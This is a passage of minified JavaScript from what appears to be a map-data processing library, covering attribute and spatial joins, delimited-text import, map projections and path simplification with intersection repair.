a?a[f]:null,n=f==u&&e.shapeId==s.shapeId&&e.partId==s.partId,r?n?r[r.length-1].push(l):r.push([l]):(r=[[l]],a[f]=r,o.push(r)),e.i==i.arcs.length-1&&r.length>1&&r[0][0]==i.arcs[0]&&(r[0]=r.pop().concat(r[0]))),s=e,u=f}function r(e){i=e}var i,o=[],a={},s=null,u="";return It.traversePaths(e,n,r),o},It.getArcClassifier=function(e,t){function n(e,t){var n="";return i[e]>-1&&(n=t(i[e],o[e]),n&&(i[e]=-1,o[e]=-1)),n}var r=t.size(),i=new Int32Array(r),o=new Int32Array(r);return yt.initializeArray(i,-1),yt.initializeArray(o,-1),It.traversePaths(e,function(e){var t=c(e.arcId),n=e.shapeId,r=i[t];-1==r?i[t]=n:r>n?(o[t]=r,i[t]=n):o[t]=n}),function(e){return function(t){return n(t,e)}}},wt.inspect=function(e,t,n){var r,i=It.selectFeatures(e,t,n);r=1==i.length?It.getFeatureInfo(i[0],e,t):yt.format("[inspect] Expression matched %d feature%s. Select one feature for details",i.length,yt.pluralSuffix(i.length)),s(r)},It.getFeatureInfo=function(e,t,n){var r="Feature "+e+"\n";return r+=It.getGeometryInfo(t,e),r+=It.getShapeInfo(e,t,n),r+=It.getTableInfo(t,e)},It.getShapeInfo=function(e,t,n){var r,i=t.shapes?t.shapes[e]:null,o=t.geometry_type,a="";return i&&o&&("point"==o?a+="	Points: "+i.length+"\n":"polyline"==o?a+="	Parts: "+i.length+"\n":"polygon"==o&&(r=It.getPolygonInfo(i,n),a+=yt.format("	Rings: %d cw, %d ccw\n",r.cw,r.ccw),a+="	Planar area: "+r.area+"\n",r.sph_area&&(a+="	Spherical area: "+r.sph_area+" sq. meters\n"))),a},It.getPolygonInfo=function(e,t){for(var n,r={rings:e.length,cw:0,ccw:0,area:0},i=0;i<e.length;i++)n=_t.getPlanarPathArea(e[i],t),n>0?r.cw++:0>n&&r.ccw++,r.area+=n;return t.isPlanar()||(r.sph_area=_t.getSphericalShapeArea(e,t)),r},It.selectFeatures=function(e,t,n){var r,i=It.getFeatureCount(e),a=[];return n.expression||o("[inspect] Missing a JS expression for selecting a feature"),r=It.compileValueExpression(n.expression,e,t),yt.repeat(i,function(e){var t=r(e);t===!0?a.push(e):t!==!1&&o("[inspect] Expression must return true or false")}),a},It.importDelim=function(e,t){var n=It.guessDelimiter(e);return{layers:[{data:It.importDelimTable(e,n,t)}],info:{input_delimiter:n}}},It.importDelimTable=function(e,t,n){var r,i=STtwUtilRequire.d3_dsv.dsvFormat(t).parse(e);return 0===i.length&&o("[dsv] Unable to read any records"),delete i.columns,It.adjustRecordTypes(i,n&&n.field_types),r=new ne(i),It.deleteFields(r,It.isInvalidFieldName),r},It.supportedDelimiters=["|","	",",",";"],It.isSupportedDelimiter=function(e){return yt.contains(It.supportedDelimiters,e)},It.guessDelimiter=function(e){return yt.find(It.supportedDelimiters,function(t){var n=It.getDelimiterRxp(t);return n.test(e)})||","},It.getDelimiterRxp=function(e){var t="^[^\\n\\r]+"+yt.regexEscape(e);return new RegExp(t)},It.adjustRecordTypes=function(e,t){var n,r={},i=Object.keys(e[0]||[]);t&&It.parseFieldHeaders(t,r),i.forEach(function(t){n=r[t]||It.detectConversionType(t,e),"number"==n?It.convertDataField(e,t,yt.parseNumber):"string"==n&&It.convertDataField(e,t,yt.parseString)})},It.convertDataField=function(e,t,n){for(var r=0,i=e.length;i>r;r++)e[r][t]=n(e[r][t])},It.detectConversionType=function(e,t){for(var n,r=null,i=0,o=t.length;o>i;i++)if(n=t[i][e],n&&yt.isString(n)){r=yt.stringIsNumeric(n)?"number":"string";break}return r},It.validateFieldType=function(e){var t=e.toLowerCase(),n=null;return"n"==t[0]?n="number":"s"==t[0]&&(n="string"),n},It.removeTypeHints=function(e){return It.parseFieldHeaders(e,{})},It.parseFieldHeaders=function(e,t){var n=e.map(function(e){var n,r,i;return-1!=e.indexOf(":")?(n=e.split(":"),r=n[0],i=It.validateFieldType(n[1]),i||s("Invalid type hint (expected :str or :num) ["+e+"]")):"+"===e[0]?(r=e.substr(1),i="number"):r=e,i&&(t[r]=i),r});return n},yt.stringIsNumeric=function(e){var t=yt.parseNumber(e);return!isNaN(t)&&t==Number(yt.cleanNumericString(e))},yt.cleanNumericString=function(e){return String(e).replace(/,/g,"")},yt.parseString=function(e){return e?e:""},yt.parseNumber=function(e){var t=e?parseFloat(yt.cleanNumericString(e)):NaN;return isNaN(t)?null:t},wt.joinPointsToPolygons=function(e,t,n,r){var i=It.getPolygonToPointsFunction(e,t,n,r);return It.prepJoinLayers(e,n),It.joinTables(e.data,n.data,i,r)},wt.joinPolygonsToPoints=function(e,t,n,r){var i=It.getPointToPolygonFunction(e,t,n,r);return It.prepJoinLayers(e,t),It.joinTables(e.data,t.data,i,r)},It.prepJoinLayers=function(e,t){e.data||(e.data=new ne(e.shapes.length)),t.data||o("[join] Can't join a layer that is missing attribute data")},It.getPolygonToPointsFunction=function(e,t,n,r){for(var i,o,a=It.getPointToPolygonFunction(n,e,t,r),s=[],u=0,l=n.shapes.length;l>u;u++)i=a(u),i&&(o=i[0],o in s?s[o].push(u):s[o]=[u]);return function(e){return s[e]||null}},It.getPointToPolygonFunction=function(e,t,n,r){var i=new Q(t.shapes,n),o=e.shapes;return function(e){var t=o[e],n=-1;return t&&(n=i.findEnclosingShape(t[0])),-1==n?null:[n]}},wt.join=function(e,t,n){var r,i,a,s,u;n.keys?(2!=n.keys.length&&o("[join] Expected two key fields: a target field and a source field"),r=It.getJoinTable(t,n),u=wt.joinAttributesToFeatures(e,r,n)):(r=It.getJoinDataset(t,n),r||o("[join] Missing a joinable data source"),i=r.layers[0],a=i.geometry_type,s=e.geometry_type,"point"==a&&"polygon"==s?u=wt.joinPointsToPolygons(e,t.arcs,i,n):"polygon"==a&&"point"==s?u=wt.joinPolygonsToPoints(e,i,r.arcs,n):o(yt.format("[join] Unable to join %s geometry to %s geometry",a||"null",s||"null"))),u.unmatched&&t.layers.push(u.unmatched),u.unjoined&&t.layers.push(u.unjoined)},It.getJoinTable=function(e,t){var n,r=It.findMatchingLayers(e.layers,t.source);return n=r.length>0?r[0].data:wt.importJoinTable(t.source,t)},It.getJoinDataset=function(e,t){var n=It.findMatchingLayers(e.layers,t.source);return n.length||(e=wt.importFile(t.source,t),n=e.layers),n.length?{arcs:e.arcs,layers:[n[0]]}:null},wt.importJoinTable=function(e,t){var n=[];t.keys&&n.push(t.keys[1]),t.fields&&(n=n.concat(t.fields)),t.field_types&&(n=n.concat(t.field_types));var r=yt.defaults({field_types:n},t);return wt.importDataTable(e,r)},wt.joinAttributesToFeatures=function(e,t,n){var r=It.removeTypeHints(n.keys),i=r[0],o=r[1],a=e.data,s=n.fields||yt.difference(t.getFields(),[o]),u=It.getJoinByKey(a,i,t,o);return n=yt.defaults({fields:s},n),It.joinTables(a,t,u,n)},It.joinTables=function(e,t,n,r){var i,a,s,u,l,c,f=t.getRecords(),p=e.getRecords(),d=[],h=It.getFieldsToJoin(e,t,r),g=r.sum_fields||[],m=yt.difference(h,g),y=It.getCountFieldName(e.getFields()),v=g.length>0,x=new Uint32Array(f.length),b=0,S=0,P={};r.where&&(c=It.getJoinFilter(t,r.where));for(var w=0,I=p.length;I>w;w++){s=p[w],u=n(w),l=0;for(var A=0,F=u?u.length:0;F>A;A++)a=u[A],(!c||c(a))&&(i=f[a],m.length>0&&(0===l?It.joinByCopy(s,i,m):S++),g.length>0&&It.joinBySum(s,i,g),x[a]++,l++);l>0?b++:s&&(r.unmatched&&d.push(yt.extend({},s)),It.updateUnmatchedRecord(s,m,g)),v&&(s[y]=l)}return 0===b&&o("[join] No records could be joined"),It.printJoinMessage(b,p.length,It.countJoins(x),f.length,S),r.unjoined&&(P.unjoined={name:"unjoined",data:new ne(f.filter(function(e,t){return 0===x[t]}))}),r.unmatched&&(P.unmatched={name:"unmatched",data:new ne(d)}),P},It.countJoins=function(e){for(var t=0,n=0,r=e.length;r>n;n++)e[n]>0&&t++;return t},It.updateUnmatchedRecord=function(e,t,n){It.joinByCopy(e,{},t),It.joinBySum(e,{},n)},It.getCountFieldName=function(e){var t=It.getUniqFieldNames(e.concat("joins"));return t.pop()},It.joinByCopy=function(e,t,n){for(var r,i=0,o=n.length;o>i;i++)r=n[i],Object.prototype.hasOwnProperty.call(t,r)?e[r]=t[r]:Object.prototype.hasOwnProperty.call(e,r)||(e[r]=null)},It.joinBySum=function(e,t,n){for(var r,i=0;i<n.length;i++)r=n[i],e[r]=(e[r]||0)+(t[r]||0)},It.printJoinMessage=function(e,t,n,r,i){s(yt.format("[join] Joined %'d data record%s",n,yt.pluralSuffix(n))),t>e&&s(yt.format("[join] %d/%d target records received no data",t-e,t)),r>n&&s(yt.format("[join] %d/%d source records could not be joined",r-n,r)),i>0&&s(yt.format("[join] %'d collision%s occured; data was copied from the first matching source record",i,yt.pluralSuffix(i)))},It.getFieldsToJoin=function(e,t,n){var r;return r=n.fields?It.removeTypeHints(n.fields):t.getFields(),n.force||(r=yt.difference(r,e.getFields())),r},It.getJoinByKey=function(e,t,n,r){var i=e.getRecords(),a=It.createTableIndex(n.getRecords(),r);return n.fieldExists(r)===!1&&o("[join] External table is missing a field named:",r),e&&e.fieldExists(t)||o("[join] Target layer is missing key field:",t),function(e){var n=i[e],r=n&&n[t],o=null;return n&&r in a&&(o=a[r]),o}},It.getJoinFilter=function(e,t){var n=It.compileValueExpression(t,{data:e},null);return function(e){var t=n(e);return t!==!0&&t!==!1&&o('[join] "where" expression must return true or false'),t}},It.createTableIndex=function(e,t){for(var n,r,i={},o=0,a=e.length;a>o;o++)n=e[o],r=n[t],r in i?i[r].push(o):i[r]=[o];return i},wt.keepEveryPolygon=It.keepEveryPolygon=function(e,t){bt.start(),t.forEach(function(t){"polygon"==t.geometry_type&&It.protectLayerShapes(e,t.shapes)}),bt.stop("Protect shapes")},It.protectLayerShapes=function(e,t){t.forEach(function(t){It.protectShape(e,t)})},It.protectShape=function(e,t){for(var n,r,i=0,o=t?t.length:0,a=0;o>a;a++)r=e.getSimpleShapeBounds(t[a]).area(),r>i&&(n=t[a],i=r);n&&0!==n.length?1==n.length?It.protectIslandRing(e,n):It.protectMultiRing(e,n):u("[protectShape()] Invalid shape:",t)},It.protectIslandRing=function(e,t){var n=It.lockMaxThreshold(e,t);1==n&&(n+=It.lockMaxThreshold(e,t)),2>n&&u("[protectIslandRing()] Failed on ring:",t)},It.protectMultiRing=function(e,t){var n,r,i=e.getRetainedInterval(),o=0;for(e.setRetainedInterval(1/0),n=_t.getPlanarPathArea(t,e);o>=n;){if(r=It.lockMaxThreshold(e,t),0===r){u("[protectMultiRing()] Failed on ring:",t);break}n=_t.getPlanarPathArea(t,e)}e.setRetainedInterval(i)},It.lockMaxThreshold=function(e,t){for(var n,r,i,o,a,s,u=0,l=e.getVertexData(),c=0;c<t.length;c++)r=t[c],0>r&&(r=~r),a=l.ii[r],s=a+l.nn[r]-1,i=It.findNextRemovableVertex(l.zz,1/0,a,s),-1!=i&&(o=l.zz[i],o>u&&(u=o,n=r));return u>0?(a=l.ii[n],s=a+l.nn[n]-1,It.replaceInArray(l.zz,u,1/0,a,s)):0},It.replaceInArray=function(e,t,n,r,i){for(var o=0,a=r;i>=a;a++)e[a]===t&&(e[a]=n,o++);return o},wt.stitch=function(e){var t,n,r=e.arcs;(!r||r.isPlanar())&&i("[stitch] Requires lat-lng dataset"),It.snapEdgeArcs(r)&&(n=It.divideArcs(e),t=It.getPolygonDissolver(n,!0),e.layers.forEach(function(e){if("polygon"==e.geometry_type){var n=e.shapes,i=It.findEdgeShapes(n,r);i.forEach(function(e){n[e]=t(n[e])})}}))},It.findEdgeArcs=function(e){for(var t=It.getWorldBounds(),n=[],r=0,i=e.size();i>r;r++)e.arcIsContained(r,t)||n.push(r);return n},It.findEdgeShapes=function(e,t){var n=It.findEdgeArcs(t);return It.findShapesByArcId(e,n,t.size())},It.snapEdgeArcs=function(e){for(var t,n,r=e.getVertexData(),i=r.xx,o=r.yy,a=!1,s=1e-10,u=-180,l=180,c=-90,f=90,p=0,d=i.length;d>p;p++)t=o[p],n=i[p],(u+s>=n||n>=l-s)&&(a=!0,i[p]=u),c+s>=t?(a=!0,o[p]=c,i[p]=u):t>=f-s&&(a=!0,o[p]=f,i[p]=u);return a},wt.mergeLayers=function(e){function t(e){var t=e.geometry_type||"";return e.data&&(t+="~"+e.data.getFields().sort().join(",")),t}var n={},r=[];return e.forEach(function(e){var i,o,a=t(e);a in n==!1?(n[a]=e,r.push(e)):(i=n[a],i.name=yt.mergeNames(i.name,e.name),i.shapes=i.shapes.concat(e.shapes),i.data&&(o=i.data.getRecords().concat(e.data.getRecords()),i.data=new ne(o)))}),r.length>=2&&o("[merge-layers] Unable to merge "+(r.length<e.length?"some ":"")+"layers. Geometry and data fields must be compatible."),r},It.mergeDatasetsForExport=function(e){var t=e.map(function(e){return yt.defaults({layers:e.layers.map(It.copyLayerShapes)},e)});return It.mergeDatasets(t)},It.mergeDatasets=function(e){var t,n=[],r=0,o=[];return e.forEach(function(e){var t=e.arcs?e.arcs.size():0;t>0&&n.push(e.arcs),e.layers.forEach(function(e){("polygon"==e.geometry_type||"polyline"==e.geometry_type)&&It.forEachArcId(e.shapes,function(e){return 0>e?e-r:e+r}),o.push(e)}),r+=t}),t=It.mergeArcs(n),t.size()!=r&&i("[mergeDatasets()] Arc indexing error"),{arcs:t,layers:o}},It.mergeArcs=function(e){var t=e.map(function(e){return e.getRetainedInterval()>0&&(u("Baking-in simplification setting."),e.flatten()),e.getVertexData()}),n=yt.mergeArrays(yt.pluck(t,"xx"),Float64Array),r=yt.mergeArrays(yt.pluck(t,"yy"),Float64Array),i=yt.mergeArrays(yt.pluck(t,"nn"),Int32Array);return new Z(i,n,r)},yt.countElements=function(e){return e.reduce(function(e,t){return e+(t.length||0)},0)},yt.mergeArrays=function(e,t){var n=yt.countElements(e),r=t||Array,i=new r(n),o=0;return e.forEach(function(e){for(var t=e.length,n=0;t>n;n++)i[n+o]=e[n];o+=t}),i},wt.mergeFiles=function(e,t){var n=e.map(function(e){var n=yt.defaults({no_topology:!0,auto_snap:!1,snap_interval:null,files:[e]},t);return wt.importFile(e,n)}),r=n.map(function(e){return e.info.input_format});1!=yt.uniq(r).length&&o("Importing files with different formats is not supported");var i=It.mergeDatasets(n);return i.info=n[0].info,i.info.input_files=e,t.no_topology||"topojson"==i.info.input_format||((t.auto_snap||t.snap_interval)&&(bt.start(),It.snapCoords(i.arcs,t.snap_interval),bt.stop("Snapping points")),wt.buildTopology(i)),t.merge_files&&(i.layers=wt.mergeLayers(i.layers)),i},wt.createPointLayer=function(e,t,n){var r=It.getOutputLayer(e,n);r.shapes=n.x||n.y?It.pointsFromDataTable(e.data,n):It.pointsFromPolygons(e,t,n),r.geometry_type="point";var i=r.shapes.reduce(function(e,t){return t||e++,e},0);return i>0&&s(yt.format("[points] %,d of %,d points are null",i,r.shapes.length)),e.data&&(r.data=n.no_replace?e.data.clone():e.data),r},It.pointsFromPolygons=function(e,t,n){"polygon"!=e.geometry_type&&o("[points] Expected a polygon layer");var r=n.inner?_t.findInteriorPoint:_t.getShapeCentroid;return e.shapes.map(function(e){var n=r(e,t);return n?[[n.x,n.y]]:null})},It.pointsFromDataTable=function(e,t){return e||o("[points] Layer is missing a data table"),t.x&&t.y&&e.fieldExists(t.x)&&e.fieldExists(t.y)||o("[points] Missing x,y data fields"),e.getRecords().map(function(e){var n=e[t.x],r=e[t.y];return yt.isFiniteNumber(n)&&yt.isFiniteNumber(r)?[[n,r]]:null})},It.projectionIndex={webmercator:Ne,mercator:Le,albers:Ue,albersusa:je,albersnyt:je,lambertcc:Ge,transversemercator:Be,utm:Te,winkeltripel:He,robinson:Ye};var Ot=Math.PI/180;We.prototype.transformXY=function(e,t,n){return n=n||{},n.x=e*this.a+t*this.c+this.tx,n.y=e*this.b+t*this.d+this.ty,n},We.prototype.translate=function(e,t){this.tx+=e,this.ty+=t},We.prototype.rotate=function(e,t,n){var r=Math.cos(e),i=Math.sin(e);t=t||0,n=n||0,this.a=r,this.c=-i,this.b=i,this.d=r,this.tx+=t-t*r+n*i,this.ty+=n-t*i-n*r},We.prototype.scale=function(e,t){this.a*=e,this.c*=e,this.b*=t,this.d*=t},It.editArcs=function(e,t){function n(e){s.push(e.x),u.push(e.y),o++}function r(e,t){var r,s,u,l,c=0;for(o=0;e.hasNext();)r=e.x,s=e.y,t(n,r,s,u,l,c++),u=r,l=s;1==o&&i("An invalid arc was created"),a.push(o)}var o,a=[],s=[],u=[];e.forEach(function(e,n){r(e,t)}),e.updateVertexData(a,s,u)},wt.proj=function(e,t){var n=It.getProjection(t.projection,t);n||o("[proj] Unknown projection:",t.projection),It.projectDataset(e,n,t)},It.getProjection=function(e,t){var n=It.projectionIndex[e.toLowerCase().replace(/-_ /g,"")];return n?new n(t):null},It.printProjections=function(){var e=Object.keys(It.projectionIndex);e.sort(),e.forEach(function(e){s(e)})},It.projectDataset=function(e,t,n){e.layers.forEach(function(e){It.layerHasPoints(e)&&It.projectPointLayer(e,t)}),e.arcs&&(n.densify?It.projectAndDensifyArcs(e.arcs,t):It.projectArcs(e.arcs,t)),e.info&&(e.info.output_crs=null,e.info.output_prj=null)},It.projectPointLayer=function(e,t){var n={x:0,y:0};It.forEachPoint(e.shapes,function(e){t.projectLatLng(e[1],e[0],n),e[0]=n.x,e[1]=n.y})},It.projectArcs=function(e,t){var n=e.getVertexData(),r=n.xx,i=n.yy,a=n.zz,s={x:0,y:0};e.isPlanar()&&o("[proj] Only projection from lat-lng coordinates is supported");for(var u=0,l=r.length;l>u;u++)t.projectLatLng(i[u],r[u],s),r[u]=s.x,i[u]=s.y;e.updateVertexData(n.nn,r,i,a)},It.getDefaultDensifyInterval=function(e,t){var n=It.getAvgSegment2(e),r=e.getBounds(),i=t.projectLatLng(r.centerY(),r.centerX()),o=t.projectLatLng(r.centerY()+n[1],r.centerX());return h(i.x,i.y,o.x,o.y)},It.densifySegment=function(e,t,n,r,i,o,a,s,u,l,c){var f=(e+i)/2,p=(t+o)/2,d=u.projectLatLng(p,f),g=_t.pointSegDistSq(d.x,d.y,n,r,a,s);return c=c||[],g>l*l&&h(e,t,i,o)>.01&&(It.densifySegment(e,t,n,r,f,p,d.x,d.y,u,l,c),c.push(d),It.densifySegment(f,p,d.x,d.y,i,o,a,s,u,l,c)),c},It.projectAndDensifyArcs=function(e,t){function n(e,n,o,a,s,u){var l=i,c=l.x,f=l.y;t.projectLatLng(o,n,l),u>0&&d(l.x,l.y,c,f)>r*r*25&&It.densifySegment(a,s,c,f,n,o,l.x,l.y,t,r).forEach(e),e(l)}var r=It.getDefaultDensifyInterval(e,t),i={x:0,y:0};It.editArcs(e,n)},wt.renameLayers=function(e,t){var n=t&&t.length||0;e.forEach(function(r,i){var o;0===n?o="layer"+(i+1):(o=n-1>i?t[i]:t[n-1],n<e.length&&i>=n-2&&(o+=i-n+2)),r.name=o})};var jt={};jt.getArcCalculator=function(e,t){var n=new Xe,r=yt.expandoBuffer(Int32Array),o=yt.expandoBuffer(Int32Array),a=t?function(t,n,r,i,o,a){return e(i[t],o[t],a[t],i[n],o[n],a[n],i[r],o[r],a[r])}:function(t,n,r,i,o){return e(i[t],o[t],i[n],o[n],i[r],o[r])};return function(e,s,u,l){var c,f,p,d,h=e.length,g=r(h),m=o(h),y=-(1/0);for(l&&!t?i("[visvalingam] Received z-axis data for 2D simplification"):!l&&t?i("[visvalingam] Missing z-axis data for 3D simplification"):e.length>s.length&&i("[visvalingam] Incompatible data arrays:",e.length,s.length),p=0;h>p;p++)f=p-1,d=p+1,c=0>f||d>=h?1/0:a(f,p,d,s,u,l),e[p]=c,m[p]=d,g[p]=f;for(n.init(e);n.size()>0&&(p=n.pop(),c=e[p],c!==1/0);)y>c?e[p]=y:y=c,f=g[p],d=m[p],f>0&&(c=a(g[f],f,d,s,u,l),n.updateValue(f,c)),h-1>d&&(c=a(f,d,m[d],s,u,l),n.updateValue(d,c)),m[f]=d,g[d]=f}},jt.standardMetric=k,jt.standardMetric3D=G,jt.getWeightedMetric=function(e){var t=jt.getWeightFunction(e);return function(e,n,r,i,o,a){var s=k(e,n,r,i,o,a),u=z(e,n,r,i,o,a);return t(u)*s}},jt.getWeightedMetric3D=function(e){var t=jt.getWeightFunction(e);return function(e,n,r,i,o,a,s,u,l){var c=G(e,n,r,i,o,a,s,u,l),f=V(e,n,r,i,o,a,s,u,l);return t(f)*c}},jt.getWeightCoefficient=function(e){return e&&yt.isNumber(e&&e.weighting)?e.weighting:.7},jt.getWeightFunction=function(e){var t=jt.getWeightCoefficient(e);return function(e){return-e*t+1}},jt.weight=function(e){var t=.7;return-e*t+1},jt.getEffectiveAreaSimplifier=function(e){var t=e?jt.standardMetric3D:jt.standardMetric;return jt.getPathSimplifier(t,e)},jt.getWeightedSimplifier=function(e,t){var n=t?jt.getWeightedMetric3D(e):jt.getWeightedMetric(e);return jt.getPathSimplifier(n,t)},jt.getPathSimplifier=function(e,t){return jt.scaledSimplify(jt.getArcCalculator(e,t))},jt.scaledSimplify=function(e){return function(t,n,r,i){e(t,n,r,i);for(var o=1,a=t.length-1;a>o;o++)t[o]=.65*Math.sqrt(t[o])}};var kt={};kt.metricSq3D=_t.pointSegDistSq3D,kt.metricSq=_t.pointSegDistSq,kt.calcArcData=function(e,t,n,r){function i(o,s,u,l){var c,f,p=t[o],d=n[o],h=t[s],g=n[s];a&&(c=r[o],f=r[s]);for(var m,y=0,v=0,x=0,b=0,S=o+1;s>S;S++)m=a?kt.metricSq3D(t[S],n[S],r[S],p,d,c,h,g,f):kt.metricSq(t[S],n[S],p,d,h,g),m>=y&&(y=m,v=S);return y>l&&(y=l),v-o>1&&(x=i(o,v,u+1,y)),s-v>1&&(b=i(v,s,u+1,y)),1==u&&p==h&&d==g&&(y=Math.max(x,b)),e[v]=Math.sqrt(y),y}var o=e.length,a=!!r;e[0]=e[o-1]=1/0,o>2&&i(0,o-1,1,Number.MAX_VALUE)},wt.findAndRepairIntersections=function(e){bt.start();var t,n=It.findSegmentIntersections(e),r=It.repairIntersections(e,n),i=n.length,o=r.length,a=i>o?i-o:0;bt.stop("Find and repair intersections"),i>0&&(t=yt.format("[simplify] Repaired %'i intersection%s",a,yt.pluralSuffix(a)),o>0&&(t+=yt.format("; %'i intersection%s could not be repaired",o,yt.pluralSuffix(o))),s(t))},It.repairIntersections=function(e,t){for(;It.unwindIntersections(e,t)>0;)t=It.findSegmentIntersections(e);return t},It.unwindIntersections=function(e,t){var n,r,i,o,a=e.getVertexData(),s=e.getRetainedInterval(),l=0,c=0;for(r=It.getUnwindTargets(t,s,a.zz),yt.sortOn(r,"z",!0);r.length>0;)for(i=r.pop(),n=It.redetectIntersectionTarget(i,s,a.xx,a.yy,a.zz),1==n.length&&(n=It.unwindIntersection(n[0],s,a.zz),l++),o=0;o<n.length;o++)It.insertUnwindTarget(r,n[o]);return++c>5e5?(u("Caught an infinite loop at intersection:",i),0):l},It.getUnwindTargets=function(e,t,n){return e.reduce(function(e,r){var i=It.getUnwindTarget(r,t,n);return null!==i&&e.push(i),e},[])},It.getUnwindTarget=function(e,t,n){var r,i=It.findNextRemovableVertex(n,t,e.a[0],e.a[1]),o=It.findNextRemovableVertex(n,t,e.b[0],e.b[1]);return r=-1==i&&-1==o?null:-1==o||-1!=i&&n[i]>n[o]?{a:e.a,b:e.b,z:n[i]}:{a:e.b,b:e.a,z:n[o]}},It.insertUnwindTarget=function(e,t){for(var n=e.length;n>0&&!(e[n-1].z<=t.z);)e[n]=e[n-1],n--;e[n]=t},It.unwindIntersection=function(e,t,n){for(var r=[],o=e.a[0],a=e.a[1],s=e.z,u=o+1;a>=u;u++)(n[u]==s||u==a)&&(r.push({a:[o,u],b:e.b,z:s}),u!=a&&(n[u]=t),o=u);return r.length<2&&i("Error in unwindIntersection()"),r},It.redetectIntersectionTarget=function(e,t,n,r,i){var o=It.getIntersectionCandidates(e,t,n,r,i),a=It.intersectSegments(o,n,r);return It.getUnwindTargets(a,t,i)},It.getIntersectionCandidates=function(e,t,n,r,i){var o=It.getSegmentVertices(e.a,t,n,r,i);return o=o.concat(It.getSegmentVertices(e.b,t,n,r,i))},It.getSegmentVertices=function(e,t,n,r,i){var o,a,s,u=[];e[0]<=e[1]?(o=e[0],a=e[1]):(o=e[1],a=e[0]),s=o;for(var l=o+1;a>=l;l++)i[l]>=t&&(n[s]<n[l]?u.push(s,l):u.push(l,s),s=l);return u},It.calcSimplifyStats=function(e,t){function n(e,t,n,r,i,o){var a=[],s=[],u=[];return _t.convLngLatToSph([e,n,i],[t,r,o],a,s,u),_t.pointSegDistSq3D(a[0],s[0],u[0],a[1],s[1],u[1],a[2],s[2],u[2])}var r,i=t?n:_t.pointSegDistSq,o=t?_t.signedAngleSph:_t.signedAngle,a=0,s=0,u=0,l=0,c=0,f=0,p=-1,d=-1,h=[],g=[],m=e.getVertexData().zz;return e.forEachSegment(function(e,t,n,r){var y,v,x,b,S,P,w,I,A;if(y=n[e],v=r[e],x=n[t],b=r[t],e==d&&(I=o(n[p],r[p],y,v,x,b),I>Math.PI&&(I=2*Math.PI-I),isNaN(I)||g.push(180*I/Math.PI)),p=e,d=t,m[e]<1/0&&s++,w=t-e-1,!(1>w))if(a+=w,y==x&&v==b)u++;else{for(S=0;++e<t;)A=i(n[e],r[e],y,v,x,b),S=Math.max(S,A);f+=S,P=Math.sqrt(S),c+=P,h.push(P),l=Math.max(l,P)}}),r={angleMean:0,displacementMean:0,displacementMax:l,collapsedRings:u,removed:a,retained:s,uniqueCount:It.countUniqueVertices(e),removableCount:a+s},g.length>0&&(r.angleMean=yt.sum(g)/g.length,r.angleQuartiles=[yt.findValueByPct(g,.75),yt.findValueByPct(g,.5),yt.findValueByPct(g,.25)]),h.length>0&&(r.displacementMean=c/h.length,r.displacementQuartiles=[yt.findValueByPct(h,.75),yt.findValueByPct(h,.5),yt.findValueByPct(h,.25)]),r},It.countUniqueVertices=function(e){var t=2*e.size(),n=new ee(e).size();return e.getPointCount()-t+n},It.getSimplifyMethodLabel=function(e){return{dp:"Ramer-Douglas-Peucker",visvalingam:"Visvalingam",weighted_visvalingam:"Weighted Visvalingam"}[e]||"Unknown"},It.printSimplifyInfo=function(e,t){var n=It.getSimplifyMethod(t),r=It.getSimplifyMethodLabel(n),i=It.useSphericalSimplify(e,t),o=It.calcSimplifyStats(e,i),a=(o.removed+o.collapsedRings)/o.uniqueCount||0,u=o.removed/o.removableCount||0,l=o.angleQuartiles,c=o.displacementQuartiles,f=["Simplification statistics"];f.push(yt.format("Method: %s (%s) %s",r,i?"spherical":"planar","weighted_visvalingam"==n?"(weighting="+jt.getWeightCoefficient(t)+")":"")),f.push(yt.format("Removed vertices: %,d",o.removed+o.collapsedRings)),f.push(yt.format("	 %.1f% of %,d unique coordinate locations",100*a,o.uniqueCount)),f.push(yt.format("	 %.1f% of %,d filterable coordinate locations",100*u,o.removableCount)),f.push(yt.format("Simplification threshold: %.4f %s",e.getRetainedInterval(),i?"meters":"")),f.push(yt.format("Collapsed rings: %,d",o.collapsedRings)),f.push("Displacement statistics"),f.push(yt.format("	 Mean displacement: %.4f",o.displacementMean)),f.push(yt.format("	 Max displacement: %.4f",o.displacementMax)),f.push(yt.format("	 Quartiles: %.2f, %.2f, %.2f",c[0],c[1],c[2])),f.push("Vertex angle statistics"),f.push(yt.format("	 Mean angle: %.2f degrees",o.angleMean)),f.push(yt.format("	 Quartiles: %.2f, %.2f, %.2f",l[0],l[1],l[2])),s(f.join("\n	 "))},wt.simplify=function(e,t){var n=e.arcs;n||o("[simplify] Missing path data"),t=It.getStandardSimplifyOpts(e,t),e.info=yt.defaults({simplify:t},e.info),bt.start(),It.simplifyPaths(n,t),yt.isNumber(t.pct)?n.setRetainedPct(t.pct):yt.isNumber(t.interval)?n.setRetainedInterval(t.interval):t.resolution&&n.setRetainedInterval(It.calcSimplifyInterval(n,t)),bt.stop("Calculate simplification"),t.keep_shapes&&wt.keepEveryPolygon(n,e.layers),!t.no_repair&&n.getRetainedInterval()>0&&wt.findAndRepairIntersections(n),t.stats&&It.printSimplifyInfo(n,t)},It.getStandardSimplifyOpts=function(e,t){return t=t||{},yt.defaults({method:It.getSimplifyMethod(t),spherical:It.useSphericalSimplify(e.arcs,t)},t)},It.useSphericalSimplify=function(e,t){return!t.planar&&!e.isPlanar()},It.simplifyPaths=function(e,t){var n=It.getSimplifyFunction(t);e.setThresholds(new Float64Array(e.getPointCount())),t.spherical?(It.simplifyPaths3D(e,n),It.protectWorldEdges(e)):It.simplifyPaths2D(e,n)},It.simplifyPaths2D=function(e,t){e.forEach3(function(e,n,r,i){t(r,e,n)})},It.simplifyPaths3D=function(e,t){var n=yt.expandoBuffer(Float64Array),r=yt.expandoBuffer(Float64Array),i=yt.expandoBuffer(Float64Array);e.forEach3(function(e,o,a,s){var u=e.length,l=n(u),c=r(u),f=i(u);_t.convLngLatToSph(e,o,l,c,f),t(a,l,c,f)})},It.getSimplifyMethod=function(e){var t=e.method;return(!t||"weighted"==t||"visvalingam"==t&&e.weighting)&&(t="weighted_visvalingam"),t},It.getSimplifyFunction=function(e){var t;return"dp"==e.method?t=kt.calcArcData:"visvalingam"==e.method?t=jt.getEffectiveAreaSimplifier(e.spherical):"weighted_visvalingam"==e.method?t=jt.getWeightedSimplifier(e,e.spherical):o("[simplify] Unsupported simplify method:",method),t},It.protectWorldEdges=function(e){var t=It.getWorldBounds(1e-12),n=e.getBounds().toArray();Y(t,n)!==!0&&e.forEach3(function(e,n,r){for(var 